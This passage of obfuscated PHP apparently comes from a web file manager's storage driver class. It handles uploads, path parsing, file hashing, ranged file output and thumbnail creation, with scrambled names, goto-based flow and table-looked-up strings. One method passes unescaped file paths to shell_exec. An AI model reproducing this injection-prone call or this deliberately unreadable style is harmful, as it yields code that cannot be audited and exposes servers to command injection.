$a¡Ë›…¶[$Cñ„ˆŒ¶öİ[76]]; $eó°‡éç… = $a¡Ë›…¶[$Cñ„ˆŒ¶öİ[76]]; if (isset($a¡Ë›…¶[$Cñ„ˆŒ¶öİ[85]])) { $fØßŠ¼—„› = $a¡Ë›…¶[$Cñ„ˆŒ¶öİ[85]][$Cñ„ˆŒ¶öİ[76]]; $a¡Ë›…¶[$Cñ„ˆŒ¶öİ[78]] = $a¡Ë›…¶[$Cñ„ˆŒ¶öİ[85]][$Cñ„ˆŒ¶öİ[78]]; $a¡Ë›…¶[$Cñ„ˆŒ¶öİ[84]] = $a¡Ë›…¶[$Cñ„ˆŒ¶öİ[85]][$Cñ„ˆŒ¶öİ[84]]; } else { $eó°‡éç… = substr($a¡Ë›…¶[$Cñ„ˆŒ¶öİ[76]], strlen(get_path_father($cÀ´ƒ×Œˆ›))); $eó°‡éç… = $Cñ„ˆŒ¶öİ[8] . ltrim($eó°‡éç…, $Cñ„ˆŒ¶öİ[8]); } goto FšÓè®Ê½‹; EÂ¼àöãŠ˜: } return $fñÔª³“˜‹; } public function upload($fá¥¾Ï‘Ìˆ, $c˜ÉÔè÷ Â, $a¤Ñºš¥‚ğ = false, $dèÑÉ¬øİ– = REPEAT_REPLACE) { } public function uploadFileByID($bÈì”ª–¶, $dâå…â¡İ†, $EÚôŸï…­Ä) { } public function uploadFileByPath($AŠë¡ò¯¥, $b‘¬ºˆÂé…, $a³õÌÛ¢ÏŞ = array()) { } public function isUploadServer() { $Eô“ ÀÆ =& $_SERVER[úÉ·öƒÑì©]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Eô“ ÀÆ[87]) { return !0; } return $GLOBALS[$Eô“ ÀÆ[6]][$Eô“ ÀÆ[88]][$Eô“ ÀÆ[89]]; } public function isFileOutServer() { $aŠÀƒ©Ïæî =& $_SERVER[úÉ·öƒÑì©]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $aŠÀƒ©Ïæî[87]) { return !0; } return $GLOBALS[$aŠÀƒ©Ïæî[6]][$aŠÀƒ©Ïæî[88]][$aŠÀƒ©Ïæî[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($cÊ³éğö) { $cÑ¹ÛêÇ¨» =& $_SERVER[úÉ·öƒÑì©]; if (!$this->isCdnHost()) { return $cÊ³éğö; } return str_replace(trim(get_url_root($cÊ³éğö), $cÑ¹ÛêÇ¨»[8]), trim($this->cdnHost, $cÑ¹ÛêÇ¨»[8]), $cÊ³éğö); } public function uploadLink($fÑî²ù·†ğ, $C„Šğƒ¥±ì = 0) { goto c“È¶ö¦ÔÃ; E««…òµ¥: $d¸‚ä£§‘Ş = $C„Šğƒ¥±ì <= $b®±²í›ÉŞ ? $eÃÏõÒ§ê“[91] : $eÃÏõÒ§ê“[92]; $bÁ¦”è²†Â = (!$C„Šğƒ¥±ì ? 1 : ceil($C„Šğƒ¥±ì / pow(1024, 3))) * 3600 * 4; $dš‘Š·ÇÊ = $this->{$d¸‚ä£§‘Ş}($fÑî²ù·†ğ, $bÁ¦”è²†Â); goto B”¼Ã‚¸Ûí; DÔÔ¾º«î­: if (!in_array($DÁ°ëå§èÀ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $b®±²í›ÉŞ = 1024 * 1024 * 10; goto E««…òµ¥; B”¼Ã‚¸Ûí: if ($dš‘Š·ÇÊ) { $dš‘Š·ÇÊ[$eÃÏõÒ§ê“[93]] = $fÑî²ù·†ğ; $dš‘Š·ÇÊ[$eÃÏõÒ§ê“[94]] = $DÁ°ëå§èÀ; } return $dš‘Š·ÇÊ; goto Cˆ£»ÆêÚ¯; c“È¶ö¦ÔÃ: $eÃÏõÒ§ê“ =& $_SERVER[úÉ·öƒÑì©]; if ($this->isUploadServer()) { return; } $DÁ°ëå§èÀ = $this->getType(); goto DÔÔ¾º«î­; Cˆ£»ÆêÚ¯: } public function uploadFormData($e¿õ„²à±, $FËÅíÑëµ = 3600) { } public function multiUploadFormData($AÜŠ“¡Îø, $c£õ½³Ì¥ô = 3600) { } public function download($b—®®Æ‹‰, $DÉ•ãäØ¾Ù) { } public function ext($F¬ôøŸ»œĞ) { $D´ÍŒ“éÏ =& $_SERVER[úÉ·öƒÑì©]; if (strpos($F¬ôøŸ»œĞ, $D´ÍŒ“éÏ[8]) === -1) { $cƒ­›ÜòóŒ = $F¬ôøŸ»œĞ; } else { $cƒ­›ÜòóŒ = $this->pathThis($F¬ôøŸ»œĞ); } $A³î¡öÚíø = $D´ÍŒ“éÏ[33]; if (strstr($cƒ­›ÜòóŒ, $D´ÍŒ“éÏ[95])) { $A³î¡öÚíø = substr($cƒ­›ÜòóŒ, strrpos($cƒ­›ÜòóŒ, $D´ÍŒ“éÏ[95]) + 1); $A³î¡öÚíø = strtolower($A³î¡öÚíø); } if (strlen($A³î¡öÚíø) > 3 && preg_match($D´ÍŒ“éÏ[96], $A³î¡öÚíø, $f¨Ïó´ÊØª)) { $A³î¡öÚíø = $D´ÍŒ“éÏ[33]; } return $A³î¡öÚíø; } public function pathThis($b“ù³İËã‡) { $a…µÁ•¡»á =& $_SERVER[úÉ·öƒÑì©]; $b“ù³İËã‡ = str_replace($a…µÁ•¡»á[97], $a…µÁ•¡»á[8], rtrim($b“ù³İËã‡, $a…µÁ•¡»á[8])); $e¡Àóá¬§ï = strrpos($b“ù³İËã‡, $a…µÁ•¡»á[8]); if ($e¡Àóá¬§ï === !1) { return $b“ù³İËã‡; } return substr($b“ù³İËã‡, $e¡Àóá¬§ï + 1); } public function pathFather($b…‘çá©¢®) { $e‚ƒâùôĞœ =& $_SERVER[úÉ·öƒÑì©]; $b…‘çá©¢® = str_replace($e‚ƒâùôĞœ[97], $e‚ƒâùôĞœ[8], rtrim($b…‘çá©¢®, $e‚ƒâùôĞœ[8])); $FÅ…ò¶Œ¯ = strrpos($b…‘çá©¢®, $e‚ƒâùôĞœ[8]); if ($FÅ…ò¶Œ¯ === !1) { return $e‚ƒâùôĞœ[33]; } return substr($b…‘çá©¢®, 0, $FÅ…ò¶Œ¯ + 1); } public function hashSimple($cÚË‰Äæ©¸) { goto cèÊ§Ê; aƒœ§÷Âã: $FÌèôå³éÓ = intval($b Á»äÎÚ / $AêíÉªÔ¼Õ); $E²¿¢îˆì† = $dœÇ‚¾ø¢Ü[33]; for ($CÕí³£ˆ”ó = 0; $CÕí³£ˆ”ó < $AêíÉªÔ¼Õ; $CÕí³£ˆ”ó++) { $E²¿¢îˆì† .= $this->fileSubstr($cÚË‰Äæ©¸, $FÌèôå³éÓ * $CÕí³£ˆ”ó, $eôçÆ†ğÔÛ); } goto bŸïµè¢Õá; B£™‘Á„öß: $eôçÆ†ğÔÛ = 200; $AêíÉªÔ¼Õ = 50; if ($b Á»äÎÚ <= $eôçÆ†ğÔÛ * $AêíÉªÔ¼Õ) { return $this->hashMd5($cÚË‰Äæ©¸) . $b Á»äÎÚ; } goto aƒœ§÷Âã; cèÊ§Ê: $dœÇ‚¾ø¢Ü =& $_SERVER[úÉ·öƒÑì©]; if (!$cÚË‰Äæ©¸) { return md5($dœÇ‚¾ø¢Ü[33]); } $b Á»äÎÚ = $this->size($cÚË‰Äæ©¸); goto B£™‘Á„öß; bŸïµè¢Õá: $E²¿¢îˆì† .= $this->fileSubstr($cÚË‰Äæ©¸, $b Á»äÎÚ - $eôçÆ†ğÔÛ, $eôçÆ†ğÔÛ); return md5($E²¿¢îˆì†) . $b Á»äÎÚ; goto eŞ’á¶‹â°; eŞ’á¶‹â°: } public static $md5Cache = array(); public function hashMd5($BğÁÒ…Ô®™) { $BğÁÒ…Ô®™ = $this->iconvSystem($BğÁÒ…Ô®™); if (isset(self::$md5Cache[$BğÁÒ…Ô®™])) { return self::$md5Cache[$BğÁÒ…Ô®™]; } self::$md5Cache[$BğÁÒ…Ô®™] = $this->hashMd5Shell($BğÁÒ…Ô®™); if (!self::$md5Cache[$BğÁÒ…Ô®™]) { self::$md5Cache[$BğÁÒ…Ô®™] = @md5_file($BğÁÒ…Ô®™); } return self::$md5Cache[$BğÁÒ…Ô®™]; } private function hashMd5Shell($B·‡ñœßÆö) { goto aŞŸ„’èİõ; aŞŸ„’èİõ: $B˜×Â­ÕÊ =& $_SERVER[úÉ·öƒÑì©]; if (!function_exists($B˜×Â­ÕÊ[98])) { return !1; } $E–¡ÒÁõ–Á = array($B˜×Â­ÕÊ[99], $B˜×Â­ÕÊ[100]); goto C¶‰¿¦¶ƒ; C¶‰¿¦¶ƒ: $fª¦ğŒ“˜© = Cache::get($B˜×Â­ÕÊ[101]); if (!$fª¦ğŒ“˜©) { $DÃ‰–ê»š¸ = BASIC_PATH . $B˜×Â­ÕÊ[102]; $E¢—”â‚í¤ = md5_file($DÃ‰–ê»š¸); $fª¦ğŒ“˜© = $B˜×Â­ÕÊ[103]; foreach ($E–¡ÒÁõ–Á as $eñÓÁ‡Äâ) { $AÅ ŠŠ²Ë = shell_exec($eñÓÁ‡Äâ . "\x20\x22{$DÃ‰–ê»š¸}\x22"); if ($AÅ ŠŠ²Ë && substr(trim($AÅ ŠŠ²Ë), 0, 32) == $E¢—”â‚í¤) { $fª¦ğŒ“˜© = $eñÓÁ‡Äâ; break; } } Cache::set($B˜×Â­ÕÊ[101], $fª¦ğŒ“˜©, 3600); } if ($fª¦ğŒ“˜© == $B˜×Â­ÕÊ[103]) { return !1; } goto DÛÍÛ¹½‘; DÛÍÛ¹½‘: $AÅ ŠŠ²Ë = shell_exec($fª¦ğŒ“˜© . "\x20\42{$B·‡ñœßÆö}\42"); $AÅ ŠŠ²Ë = str_replace($B˜×Â­ÕÊ[104], $B˜×Â­ÕÊ[33], $AÅ ŠŠ²Ë); return substr($AÅ ŠŠ²Ë, 0, 32); goto eÑÂÌ“•ä; eÑÂÌ“•ä: } public function link($e¡ŠìªÒğ) { return $e¡ŠìªÒğ; } public function fileOut($DŠµó—‘™ª, $fê‚ğâÊĞ¶ = false, $cÍ†…Ëó¢› = false, $bØÚ¿ê‰Õç = '') { goto b»İ¡”ù; b»İ¡”ù: $AÖøÎÀ„Ê¨ =& $_SERVER[úÉ·öƒÑì©]; $this->cacheMethod(null, null); if (!$DŠµó—‘™ª || !$this->exist($DŠµó—‘™ª)) { show_json(LNG($AÖøÎÀ„Ê¨[105]), !1, $cÍ†…Ëó¢›); } goto eÛéƒÆ¾… ; bİÀ¯ğ¢À×: $EÖªÊÍÎ³Ù = get_file_mime($aËŒ«ñÛ†ª); if (strstr($EÖªÊÍÎ³Ù, $AÖøÎÀ„Ê¨[117])) { $EÖªÊÍÎ³Ù = $EÖªÊÍÎ³Ù . $AÖøÎÀ„Ê¨[118]; } if ($fê‚ğâÊĞ¶ === !1 && !mime_support($EÖªÊÍÎ³Ù)) { $fê‚ğâÊĞ¶ = !0; $EÖªÊÍÎ³Ù = $AÖøÎÀ„Ê¨[119]; } goto d›Íµù„²Û; f¶ƒ×ÖÖÇÇ: header($AÖøÎÀ„Ê¨[138] . $F¨ğÅõ³´); header($AÖøÎÀ„Ê¨[139]); if (!$fê‚ğâÊĞ¶ && $aËŒ«ñÛ†ª == $AÖøÎÀ„Ê¨[140]) { if ($F¨ğÅõ³´ > 1024 * 1024 * 5) { die; } $eğ¦¡§Ú° = $this->getContent($DŠµó—‘™ª); $eğ¦¡§Ú° = Html::clearSVG($eğ¦¡§Ú°); header($AÖøÎÀ„Ê¨[141] . strlen($eğ¦¡§Ú°)); echo $eğ¦¡§Ú°; die; } goto eŒÕ†µÓ–¨; b¨„çÖÁÓĞ: header($AÖøÎÀ„Ê¨[128]); header($AÖøÎÀ„Ê¨[129]); header($AÖøÎÀ„Ê¨[130]); goto aå–“½œ¤; aå–“½œ¤: if (isset($_SERVER[$AÖøÎÀ„Ê¨[131]]) && strtotime($_SERVER[$AÖøÎÀ„Ê¨[131]]) == $béŠâ˜‘…ï[$AÖøÎÀ„Ê¨[84]]) { header($AÖøÎÀ„Ê¨[132], !0, 304); die; } if (isset($_SERVER[$AÖøÎÀ„Ê¨[133]]) && $_SERVER[$AÖøÎÀ„Ê¨[133]] == $bØÚ¿ê‰Õç) { header($AÖøÎÀ„Ê¨[134] . $bØÚ¿ê‰Õç, !0, 304); die; } header($AÖøÎÀ„Ê¨[134] . $bØÚ¿ê‰Õç); goto EƒĞÁà—‰˜; A¾„‘öéŞ×: if (in_array($aËŒ«ñÛ†ª, array($AÖøÎÀ„Ê¨[111], $AÖøÎÀ„Ê¨[112], $AÖøÎÀ„Ê¨[113], $AÖøÎÀ„Ê¨[114]))) { $aËŒ«ñÛ†ª = $AÖøÎÀ„Ê¨[115]; } if (!$bØÚ¿ê‰Õç) { $bØÚ¿ê‰Õç = md5($c§´¾œ‚È¿ . $this->hashSimple($DŠµó—‘™ª)); } $bØÚ¿ê‰Õç = $AÖøÎÀ„Ê¨[116] . $bØÚ¿ê‰Õç . $AÖøÎÀ„Ê¨[116]; goto bİÀ¯ğ¢À×; dÁ±¬¼òœã: if ($_SERVER[$AÖøÎÀ„Ê¨[157]] == $AÖøÎÀ„Ê¨[158]) { return; } $Aœìñö™‚¿ = 1024 * 100; $e…¥‚¾ê¼š = 0; goto Cß¹ó”à¾½; Cæ£Ñ·äÃˆ: $F¨ğÅõ³´ = $béŠâ˜‘…ï[$AÖøÎÀ„Ê¨[78]]; $c§´¾œ‚È¿ = gmdate($AÖøÎÀ„Ê¨[110], $béŠâ˜‘…ï[$AÖøÎÀ„Ê¨[84]]); $cæÙ‹¬¤†ò = $cÍ†…Ëó¢› ? $cÍ†…Ëó¢› : $this->iconvApp($béŠâ˜‘…ï[$AÖøÎÀ„Ê¨[28]]); goto c¥ÖÓ‚óÆÊ; eŒÕ†µÓ–¨: $CÑÈ¨§Ñ£ = strtolower($_SERVER[$AÖøÎÀ„Ê¨[142]]); if ($a©‡ªËÜ¨Ì && $CÑÈ¨§Ñ£ && $EáÖó‚Éˆ£) { if (strstr($CÑÈ¨§Ñ£, $AÖøÎÀ„Ê¨[143])) { header($AÖøÎÀ„Ê¨[144] . $DŠµó—‘™ª); } else { if (strstr($CÑÈ¨§Ñ£, $AÖøÎÀ„Ê¨[145])) { header($AÖøÎÀ„Ê¨[146] . $DŠµó—‘™ª); } else { if (strstr($CÑÈ¨§Ñ£, $AÖøÎÀ„Ê¨[147])) { header($AÖøÎÀ„Ê¨[148] . $DŠµó—‘™ª); } } } if ($FóàÌ¸±ö») { header($AÖøÎÀ„Ê¨[149] . $FóàÌ¸±ö»); } return; } if (isset($_SERVER[$AÖøÎÀ„Ê¨[150]])) { if (preg_match($AÖøÎÀ„Ê¨[151], $_SERVER[$AÖøÎÀ„Ê¨[150]], $c“ÖÉ¬¥ÓŠ)) { $c²Ñ—†ó¨Ê = intval($c“ÖÉ¬¥ÓŠ[1]); if (!empty($c“ÖÉ¬¥ÓŠ[2])) { $eÈóé»®¯¦ = intval($c“ÖÉ¬¥ÓŠ[2]); } } header($AÖøÎÀ„Ê¨[152]); header("\103\157\156\x74\x65\156\x74\55\x52\x61\x6e\147\145\72\x20\x62\171\164\x65\163\40{$c²Ñ—†ó¨Ê}\x2d{$eÈóé»®¯¦}\x2f" . $F¨ğÅõ³´); } else { header($AÖøÎÀ„Ê¨[153]); } goto eœò¢‡Í™; eœò¢‡Í™: $B†¾”Åñµ‰ = !0; if ($_SERVER[$AÖøÎÀ„Ê¨[154]] == $AÖøÎÀ„Ê¨[155] && $F¨ğÅõ³´ > 1204 * 1024 * 1024 * 2) { $B†¾”Åñµ‰ = !1; } if ($B†¾”Åñµ‰) { header($AÖøÎÀ„Ê¨[156] . ($eÈóé»®¯¦ - $c²Ñ—†ó¨Ê + 1)); } goto dÁ±¬¼òœã; Aä÷ß³ÊÃÜ: @ob_end_clean(); set_timeout(); $béŠâ˜‘…ï = $this->infoFull($DŠµó—‘™ª); goto Cæ£Ñ·äÃˆ; CÒÜĞ¨½—ï: $e†…‰ŸÙÆ¼ = $AÖøÎÀ„Ê¨[116] . $e†…‰ŸÙÆ¼ . $AÖøÎÀ„Ê¨[122] . $e†…‰ŸÙÆ¼; if ($fê‚ğâÊĞ¶) { header($AÖøÎÀ„Ê¨[123]); header($AÖøÎÀ„Ê¨[124] . $e†…‰ŸÙÆ¼); } else { header($AÖøÎÀ„Ê¨[125] . $e†…‰ŸÙÆ¼); } header($AÖøÎÀ„Ê¨[126] . gmdate($AÖøÎÀ„Ê¨[110], time() + 3600 * 24 * 30) . $AÖøÎÀ„Ê¨[127]); goto b¨„çÖÁÓĞ; EƒĞÁà—‰˜: header($AÖøÎÀ„Ê¨[135] . $c§´¾œ‚È¿ . $AÖøÎÀ„Ê¨[127]); header($AÖøÎÀ„Ê¨[136] . $cæÙ‹¬¤†ò); header($AÖøÎÀ„Ê¨[137]); goto f¶ƒ×ÖÖÇÇ; eÛéƒÆ¾… : $a©‡ªËÜ¨Ì = $this->getType() == $AÖøÎÀ„Ê¨[106]; $EáÖó‚Éˆ£ = $GLOBALS[$AÖøÎÀ„Ê¨[6]][$AÖøÎÀ„Ê¨[88]][$AÖøÎÀ„Ê¨[107]][$AÖøÎÀ„Ê¨[108]]; $FóàÌ¸±ö» = (double) $GLOBALS[$AÖøÎÀ„Ê¨[6]][$AÖøÎÀ„Ê¨[88]][$AÖøÎÀ„Ê¨[107]][$AÖøÎÀ„Ê¨[109]] * 1024 * 1024; goto Aä÷ß³ÊÃÜ; d›Íµù„²Û: header($AÖøÎÀ„Ê¨[120]); header($AÖøÎÀ„Ê¨[121] . $EÖªÊÍÎ³Ù); $e†…‰ŸÙÆ¼ = rawurlencode($cæÙ‹¬¤†ò); goto CÒÜĞ¨½—ï; c¥ÖÓ‚óÆÊ: $c²Ñ—†ó¨Ê = 0; $eÈóé»®¯¦ = $F¨ğÅõ³´ - 1; $aËŒ«ñÛ†ª = $this->ext($cæÙ‹¬¤†ò); goto A¾„‘öéŞ×; Cß¹ó”à¾½: if ($FóàÌ¸±ö») { $e…¥‚¾ê¼š = intval(1000 * 1000 * ($Aœìñö™‚¿ / $FóàÌ¸±ö»)); } while ($c²Ñ—†ó¨Ê <= $eÈóé»®¯¦) { $fÆÉÇíóÖÏ = timeFloat(); check_abort(); $D‰ƒÏĞëœ = $eÈóé»®¯¦ - $c²Ñ—†ó¨Ê + 1; if ($D‰ƒÏĞëœ <= $Aœìñö™‚¿) { $Aœìñö™‚¿ = $D‰ƒÏĞëœ; } echo $this->fileSubstr($DŠµó—‘™ª, $c²Ñ—†ó¨Ê, $Aœìñö™‚¿); $c²Ñ—†ó¨Ê += $Aœìñö™‚¿; if ($Aœìñö™‚¿ == $D‰ƒÏĞëœ) { $c²Ñ—†ó¨Ê = $eÈóé»®¯¦ + 1; } if ($e…¥‚¾ê¼š) { $AÛ™Ç¤æíÅ = intval(1000 * 1000 * (timeFloat() - $fÆÉÇíóÖÏ)); $DŠ‹‰× à = $e…¥‚¾ê¼š - $AÛ™Ç¤æíÅ; if ($DŠ‹‰× à > 5) { usleep($DŠ‹‰× à); } } } goto AÌÎ£°ÅÈ; AÌÎ£°ÅÈ: } public function fileOutServer($a…¶¨‚‡Å, $f±Ğå³÷ˆ = false, $b¢²·¤…¢É = false, $CË‹ÖßÈä‡ = '') { $this->fileOut($a…¶¨‚‡Å, $f±Ğå³÷ˆ, $b¢²·¤…¢É, $CË‹ÖßÈä‡); } public function fileOutLink($BâŒáÒÁÔÉ) { header($_SERVER[úÉ·öƒÑì©][159] . $BâŒáÒÁÔÉ); die; } public function cacheMethod($E‘Æâ«¿ß×, $B¹¹˜îİê, $eƒ‡ä‡‰ëÒ = null) { goto c¨îİœ; bËš¡ªÀ·: $f‘†ó¸Ì­õ = $this->{$E‘Æâ«¿ß×}($B¹¹˜îİê); $DŞƒô°†ë[$DØì×‹‡§ó] = $f‘†ó¸Ì­õ; return $f‘†ó¸Ì­õ; goto eëæ©ğÂƒ„; Eî‹£ä·¿: if (!is_null($eƒ‡ä‡‰ëÒ)) { $DŞƒô°†ë[$DØì×‹‡§ó] = $eƒ‡ä‡‰ëÒ; return; } $f‘†ó¸Ì­õ = isset($DŞƒô°†ë[$DØì×‹‡§ó]) ? $DŞƒô°†ë[$DØì×‹‡§ó] : null; if (!is_null($f‘†ó¸Ì­õ)) { return $f‘†ó¸Ì­õ; } goto bËš¡ªÀ·; CÇèé“Ç™›: $DØì×‹‡§ó = $F¾Ïäè›[160] . $E‘Æâ«¿ß× . $F¾Ïäè›[161] . rtrim($Cï‘Ÿ›Ğ„ù, $F¾Ïäè›[8]); if (is_null($E‘Æâ«¿ß×)) { $DŞƒô°†ë = array(); return; } if (is_null($B¹¹˜îİê)) { unset($DŞƒô°†ë[$DØì×‹‡§ó]); return; } goto Eî‹£ä·¿; c¨îİœ: $F¾Ïäè› =& $_SERVER[úÉ·öƒÑì©]; static $DŞƒô°†ë = array(); $Cï‘Ÿ›Ğ„ù = $B¹¹˜îİê ? ltrim($this->getPathOuter($B¹¹˜îİê), $F¾Ïäè›[8]) : $B¹¹˜îİê; goto CÇèé“Ç™›; eëæ©ğÂƒ„: } public function fileOutImage($d„·†„‘œ, $Fºİ“Ë­ÁÑ = 250) { goto BÉŠƒğ â; BÉŠƒğ â: $Bˆœ›ùÎ’ø =& $_SERVER[úÉ·öƒÑì©]; set_timeout(); if (substr($d„·†„‘œ, 0, 4) == $Bˆœ›ùÎ’ø[147]) { $this->fileOutLink($d„·†„‘œ); } goto A¾¬ŠÑÒî; A¾¬ŠÑÒî: $DôÆôç‹éÕ = $this->info($d„·†„‘œ); $F‚ø»Ã²§‡ = $DôÆôç‹éÕ[$Bˆœ›ùÎ’ø[28]]; $DíîÈ»è¡ = !1; goto bºˆ‚„İÜé; a“í°µ†Ò: $DÀÑ»¦ï½ = "{$b«À„ÊåÏã}\137{$Fºİ“Ë­ÁÑ}\x2e\x70\156\x67"; if (!($CÀ²‡¢§ø = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Bˆœ›ùÎ’ø[172]))) { $Eó• ªƒÈÛ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Bˆœ›ùÎ’ø[173]); } else { $Eó• ªƒÈÛ = KodIO::make($CÀ²‡¢§ø); } if ($CÀ²‡¢§ø = IO::fileNameExist($Eó• ªƒÈÛ, $DÀÑ»¦ï½)) { $cóî™Ï²´‚ = KodIO::make($CÀ²‡¢§ø); return IO::fileOut($cóî™Ï²´‚, !1, $F‚ø»Ã²§‡); } goto eÍ§à“ùƒñ; E•©Åæ›‚: if (!@file_exists($cóî™Ï²´‚)) { $Fé°ÅÆ…°§ = TEMP_FILES; if (!is_dir($Fé°ÅÆ…°§)) { mk_dir($Fé°ÅÆ…°§); } $d°æÍ°‹‚ˆ = $Fé°ÅÆ…°§ . $b«À„ÊåÏã . $Bˆœ›ùÎ’ø[95] . $DôÆôç‹éÕ[$Bˆœ›ùÎ’ø[168]]; if (!@file_exists($d°æÍ°‹‚ˆ)) { $d°æÍ°‹‚ˆ = $this->download($d„·†„‘œ, $d°æÍ°‹‚ˆ); } ImageThumb::createThumb($d°æÍ°‹‚ˆ, $cóî™Ï²´‚, $Fºİ“Ë­ÁÑ, $Fºİ“Ë­ÁÑ * 10); } if (!file_exists($cóî™Ï²´‚) || filesize($cóî™Ï²´‚) < 100) { return @file_exists($d°æÍ°‹‚ˆ) ? IO::fileOut($d°æÍ°‹‚ˆ) : $this->fileOut($d„·†„‘œ); } if (!($fù«•ø„— = IO::move($cóî™Ï²´‚, $Eó• ªƒÈÛ))) { return IO::fileOut($cóî™Ï²´‚); } goto CÏ¬™ÁéÜ¬; bºˆ‚„İÜé: if (isset($GLOBALS[$Bˆœ›ùÎ’ø[162]]) && $GLOBALS[$Bˆœ›ùÎ’ø[162]][$Bˆœ›ùÎ’ø[76]] == $DôÆôç‹éÕ[$Bˆœ›ùÎ’ø[76]]) { $EåéØê“Ï = $GLOBALS[$Bˆœ›ùÎ’ø[162]][$Bˆœ›ùÎ’ø[163]]; if (!$DôÆôç‹éÕ[$Bˆœ›ùÎ’ø[164]]) { $DôÆôç‹éÕ[$Bˆœ›ùÎ’ø[164]] = $GLOBALS[$Bˆœ›ùÎ’ø[162]]; } if (isset($EåéØê“Ï[$Bˆœ›ùÎ’ø[165]])) { if ($EåéØê“Ï[$Bˆœ›ùÎ’ø[165]] <= $Fºİ“Ë­ÁÑ && $EåéØê“Ï[$Bˆœ›ùÎ’ø[166]] <= $Fºİ“Ë­ÁÑ) { $DíîÈ»è¡ = !0; } } $F‚ø»Ã²§‡ = $DôÆôç‹éÕ[$Bˆœ›ùÎ’ø[164]][$Bˆœ›ùÎ’ø[28]]; } if ($DôÆôç‹éÕ[$Bˆœ›ùÎ’ø[78]] <= 1024 * 50 || $DíîÈ»è¡ || !function_exists($Bˆœ›ùÎ’ø[167]) || $DôÆôç‹éÕ[$Bˆœ›ùÎ’ø[168]] == $Bˆœ›ùÎ’ø[169]) { return $this->fileOut($d„·†„‘œ, !1, $F‚ø»Ã²§‡); } if (isset($DôÆôç‹éÕ[$Bˆœ›ùÎ’ø[164]][$Bˆœ›ùÎ’ø[170]])) { $b«À„ÊåÏã = $DôÆôç‹éÕ[$Bˆœ›ùÎ’ø[164]][$Bˆœ›ùÎ’ø[170]]; } else { if (isset($DôÆôç‹éÕ[$Bˆœ›ùÎ’ø[164]][$Bˆœ›ùÎ’ø[171]])) { $b«À„ÊåÏã = $DôÆôç‹éÕ[$Bˆœ›ùÎ’ø[164]][$Bˆœ›ùÎ’ø[171]]; } else { $b«À„ÊåÏã = md5("{$DôÆôç‹éÕ[$Bˆœ›ùÎ’ø[28]]}\137{$DôÆôç‹éÕ[$Bˆœ›ùÎ’ø[76]]}\x5f{$DôÆôç‹éÕ[$Bˆœ›ùÎ’ø[78]]}"); } } goto a“í°µ†Ò; CÏ¬™ÁéÜ¬: del_file($cóî™Ï²´‚); IO::fileOut($fù«•ø„—); goto dí‡ÑóÖ¦; eÍ§à“ùƒñ: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $cóî™Ï²´‚ = DATA_THUMB . $DÀÑ»¦ï½; del_file($cóî™Ï²´‚); goto E•©Åæ›‚; dí‡ÑóÖ¦: } public function fileOutImageServer($aÓÆ„†œ·½, $aÍ„®‹Á = 250) { $this->fileOutImage($aÓÆ„†œ·½, $aÍ„®‹Á); } public function fileNameAuto($aèê¸µÁ«Ï, $a¾ò§áÎ©Å, $cĞº«ÖÏ© = REPEAT_RENAME, $A½¾–½È›ö = false) { goto d² ó¯Š«Ä; d² ó¯Š«Ä: $fÎ¾¾Ä«®Š =& $_SERVER[úÉ·öƒÑì©]; $f·Î¥µ½· = $aèê¸µÁ«Ï === $fÎ¾¾Ä«®Š[33] ? $a¾ò§áÎ©Å : rtrim($aèê¸µÁ«Ï, $fÎ¾¾Ä«®Š[8]) . $fÎ¾¾Ä«®Š[8] . $a¾ò§áÎ©Å; if ($cĞº«ÖÏ© == REPEAT_REPLACE || !$this->exist($f·Î¥µ½·) || $A½¾–½È›ö && $cĞº«ÖÏ© != REPEAT_RENAME_FOLDER) { return $a¾ò§áÎ©Å; } goto câÂéŠ¨©®; EÇö”ç‚ë: while ($this->exist(rtrim($aèê¸µÁ«Ï, $fÎ¾¾Ä«®Š[8]) . $fÎ¾¾Ä«®Š[8] . $dÆïêğ¦)) { $dÆïêğ¦ = $a£è‹©Š¿ . "\50{$CÖÕ¢ˆ¡}\x29{$F¢‹ô‡å›}"; $CÖÕ¢ˆ¡++; } return $dÆïêğ¦; goto CˆƒİƒŠÖ¨; câÂéŠ¨©®: if ($cĞº«ÖÏ© == REPEAT_SKIP) { return !1; } $F¢‹ô‡å› = $fÎ¾¾Ä«®Š[95] . get_path_ext($a¾ò§áÎ©Å); $F¢‹ô‡å› = $F¢‹ô‡å› == $fÎ¾¾Ä«®Š[95] || $A½¾–½È›ö ? $fÎ¾¾Ä«®Š[33] : $F¢‹ô‡å›; goto C©¼çËÈŒè; C©¼çËÈŒè: $CÖÕ¢ˆ¡ = 1; $a£è‹©Š¿ = substr($a¾ò§áÎ©Å, 0, strlen($a¾ò§áÎ©Å) - strlen($F¢‹ô‡å›)); $dÆïêğ¦ = $a£è‹©Š¿ . "\x28{$CÖÕ¢ˆ¡}\51{$F¢‹ô‡å›}"; goto EÇö”ç‚ë; CˆƒİƒŠÖ¨: } private function fileNameAutoList($EÖæºò—‚Ş, $EŒõÇÕ¥¶, $c‹ù¦¶´ª– = false) { goto C•¥­ØÒ‹; FÏ¾á¯ÏÑÎ: return $BêëÇ½Û®ã; goto c”Áâ³¥Î‚; C•¥­ØÒ‹: $aßÂ”³õÓ­ =& $_SERVER[úÉ·öƒÑì©]; $Bã±öé… = $this->listPath($EÖæºò—‚Ş, !0); $Bã±öé… = array_merge($Bã±öé…[$aßÂ”³õÓ­[75]], $Bã±öé…[$aßÂ”³õÓ­[74]]); goto AÒÛê›ˆµ‚; fõª…ó: $fåÑ§Ê÷ò = substr($EŒõÇÕ¥¶, 0, strlen($EŒõÇÕ¥¶) - strlen($A¨®š‡ˆÁ)); $BêëÇ½Û®ã = $fåÑ§Ê÷ò . "\x28\x30\51{$A¨®š‡ˆÁ}"; for ($bÛÀšÇáŠ = 1; $bÛÀšÇáŠ <= count($FôŠŸùµÍ´) + 1; $bÛÀšÇáŠ++) { $BêëÇ½Û®ã = $fåÑ§Ê÷ò . "\x28{$bÛÀšÇáŠ}\x29{$A¨®š‡ˆÁ}"; if (!in_array_not_case($BêëÇ½Û®ã, $FôŠŸùµÍ´)) { return $BêëÇ½Û®ã; } } goto FÏ¾á¯ÏÑÎ; AÒÛê›ˆµ‚: $FôŠŸùµÍ´ = 